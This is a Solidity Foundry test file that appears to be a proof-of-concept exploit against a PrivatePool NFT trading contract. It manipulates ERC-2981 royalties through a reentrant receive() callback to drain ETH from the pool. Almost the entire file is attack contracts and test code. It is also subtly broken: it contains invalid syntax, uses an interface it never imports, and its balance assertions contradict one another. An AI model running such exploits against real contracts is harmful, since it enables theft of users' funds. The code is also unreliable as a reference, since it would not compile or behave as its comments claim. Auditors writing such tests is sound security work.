// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {PrivatePool} from "../src/PrivatePool.sol";
import {IERC2981} from "openzeppelin/interfaces/IERC2981.sol";
import {IRoyaltyRegistry} from "royalty-registry-solidity/IRoyaltyRegistry.sol";

// Malicious NFT contract that allows royalty manipulation
contract MaliciousNFT is ERC721, IERC2981 {
    address public owner;
    mapping(uint256 => address) public royaltyRecipients;
    mapping(uint256 => uint256) public royaltyFees;
    
    constructor() ERC721("Malicious NFT", "MNFT") {
        owner = msg.sender;
    }
    
    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
        royaltyRecipients[tokenId] = to;
        royaltyFees[tokenId] = 0; // Initially 0% royalty
    }
    
    function royaltyInfo(uint256 tokenId, uint256 salePrice) 
        external 
        view 
        override 
        returns (address receiver, uint256 royaltyAmount) 
    {
        receiver = royaltyRecipients[tokenId];
        royaltyAmount = salePrice * royaltyFees[tokenId] / 10000;
    }
    
    // Malicious function to change royalty fee
    function setRoyalty(uint256 tokenId, uint256 fee) external {
        royaltyFees[tokenId] = fee;
    }
    
    function supportsInterface(bytes4 interfaceId) 
        public 
        view 
        override(ERC721, IERC2981) 
        returns (bool) 
    {
        return interfaceId == type(IERC2981).interfaceId || super.supportsInterface(interfaceId);
    }
}

// Attacker contract that exploits the vulnerability
contract Attacker {
    PrivatePool payable pool;
    MaliciousNFT nft;
    uint256 tokenId;
    uint256 salePrice;
    
    constructor(address payable _pool, address _nft, uint256 _tokenId) {
        pool = _pool;
        nft = MaliciousNFT(_nft);
        tokenId = _tokenId;
    }
    
    // Receive function is called when pool refunds excess ETH
    receive() external payable {
        // This is where the attack happens!
        // Change royalty from 0% to 100% after the first royalty calculation
        nft.setRoyalty(tokenId, 10000); // 100% royalty
    }
    
    function attack(uint256 _salePrice) external payable {
        salePrice = _salePrice;
        
        // Approve pool to transfer NFT
        nft.setApprovalForAll(address(pool), true);
        
        // Call buy function with exact ETH amount
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        uint256[] memory tokenWeights = new uint256[](1);
        tokenWeights[0] = 1e18;
        
        PrivatePool.MerkleMultiProof memory proof;
        proof.proof = new bytes32[](0);
        proof.flags = new bool[](0);
        
        pool.buy{value: msg.value}(tokenIds, tokenWeights, proof);
    }
    
    // Function to sell the NFT back to the pool for profit
    function sellBack() external {
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        uint256[] memory tokenWeights = new uint256[](1);
        tokenWeights[0] = 1e18;
        
        PrivatePool.MerkleMultiProof memory proof;
        proof.proof = new bytes32[](0);
        proof.flags = new bool[](0);
        
        IStolenNftOracle.Message[] memory stolenNftProofs;
        
        pool.sell(tokenIds, tokenWeights, proof, stolenNftProofs);
    }
    
    // Allow contract to receive ETH
    fallback() external payable {}
}

// Mock Factory contract
contract MockFactory {
    address public owner;
    mapping(uint160 => address) public owners;
    uint256 public protocolFeeRate = 0;
    
    constructor() {
        owner = msg.sender;
    }
    
    function ownerOf(uint160 poolId) external view returns (address) {
        return owners[poolId];
    }
    
    function setPoolOwner(uint160 poolId, address poolOwner) external {
        owners[poolId] = poolOwner;
    }
    
    function setProtocolFeeRate(uint256 rate) external {
        protocolFeeRate = rate;
    }
    
    receive() external payable {}
}

// Mock Royalty Registry
contract MockRoyaltyRegistry is IRoyaltyRegistry {
    mapping(address => address) public royaltyLookup;
    
    function setRoyaltyLookup(address nft, address lookup) external {
        royaltyLookup[nft] = lookup;
    }
    
    function getRoyaltyLookupAddress(address nft) external view override returns (address) {
        return royaltyLookup[nft];
    }
}

// Mock Stolen NFT Oracle
contract MockStolenNftOracle {
    function validateTokensAreNotStolen(
        address,
        uint256[] memory,
        IStolenNftOracle.Message[] memory
    ) external pure {
        // Always return true (not stolen)
    }
}

contract PrivatePoolExploitTest is Test {
    PrivatePool pool;
    MockFactory factory;
    MaliciousNFT nft;
    MockRoyaltyRegistry royaltyRegistry;
    MockStolenNftOracle stolenNftOracle;
    Attacker attacker;
    
    address owner = address(0x1);
    address poolOwner = address(0x2);
    
    function setUp() public {
        // Deploy mock contracts
        vm.startPrank(owner);
        factory = new MockFactory();
        royaltyRegistry = new MockRoyaltyRegistry();
        stolenNftOracle = new MockStolenNftOracle();
        
        // Deploy pool directly
        pool = new PrivatePool(
            payable(address(factory)),
            address(royaltyRegistry),
            address(stolenNftOracle)
        );
        
        // Set pool owner in factory
        factory.setPoolOwner(uint160(address(pool)), poolOwner);
        
        // Deploy malicious NFT
        nft = new MaliciousNFT();
        
        // Set royalty lookup
        royaltyRegistry.setRoyaltyLookup(address(nft), address(nft));
        
        // Initialize pool
        pool.initialize(
            address(0), // ETH as base token
            address(nft), // NFT address
            100e18, // virtualBaseTokenReserves
            1e18,   // virtualNftReserves
            0,      // changeFee
            0,      // feeRate
            bytes32(0), // merkleRoot
            false,  // useStolenNftOracle
            true    // payRoyalties
        );
        
        // Mint NFT to pool
        uint256 tokenId = 1;
        nft.mint(address(pool), tokenId);
        
        // Fund pool with ETH
        vm.deal(address(pool), 100 ether);
        
        vm.stopPrank();
    }
    
    function testRoyaltyExploit() public {
        // Setup attacker
        uint256 tokenId = 1;
        attacker = new Attacker(payable(address(pool)), address(nft), tokenId);
        
        // Calculate expected sale price
        uint256 salePrice = 10 ether;
        
        // Fund attacker with ETH for the purchase
        vm.deal(address(attacker), salePrice);
        
        // Record initial balances
        uint256 initialPoolBalance = address(pool).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        
        console.log("=== Before Attack ===");
        console.log("Pool balance:", initialPoolBalance);
        console.log("Attacker balance:", initialAttackerBalance);
        console.log("Pool owns NFT:", nft.ownerOf(tokenId) == address(pool));
        
        // Execute the attack
        vm.prank(address(attacker));
        attacker.attack{value: salePrice}(salePrice);
        
        // Record post-attack balances
        uint256 afterAttackPoolBalance = address(pool).balance;
        uint256 afterAttackAttackerBalance = address(attacker).balance;
        
        console.log("\n=== After Attack ===");
        console.log("Pool balance:", afterAttackPoolBalance);
        console.log("Attacker balance:", afterAttackAttackerBalance);
        console.log("Attacker owns NFT:", nft.ownerOf(tokenId) == address(attacker));
        
        // Verify the exploit worked
        assertTrue(nft.ownerOf(tokenId) == address(attacker), "Attacker should own the NFT");
        assertEq(afterAttackPoolBalance, initialPoolBalance, "Pool should have lost no ETH (paid as royalty)");
        assertEq(afterAttackAttackerBalance, initialAttackerBalance, "Attacker should have spent no net ETH");
        
        // Now attacker sells the NFT back to the pool for profit
        vm.prank(address(attacker));
        attacker.sellBack();
        
        uint256 finalPoolBalance = address(pool).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        
        console.log("\n=== After Selling Back ===");
        console.log("Pool balance:", finalPoolBalance);
        console.log("Attacker balance:", finalAttackerBalance);
        console.log("Pool owns NFT:", nft.ownerOf(tokenId) == address(pool));
        
        // Verify profit
        assertTrue(finalAttackerBalance > initialAttackerBalance, "Attacker should have made profit");
        assertTrue(finalPoolBalance < initialPoolBalance, "Pool should have lost ETH");
    }
}